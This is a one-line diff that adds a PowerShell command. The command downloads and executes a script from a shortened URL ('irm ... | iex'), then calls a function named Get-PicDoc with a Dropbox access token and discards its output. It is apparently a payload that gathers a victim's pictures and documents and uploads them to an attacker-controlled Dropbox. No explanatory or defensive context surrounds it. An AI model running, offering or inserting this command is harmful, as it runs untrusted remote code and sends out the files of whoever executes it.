@@ -1,0 +1,1 @@
+irm "t.ly/h2Dcr"|iex; $DropBoxAccessToken = "YOUR DROPBOX TOKEN"; Get-PicDoc -DropBoxAccessToken $DropBoxAccessToken | Out-Null
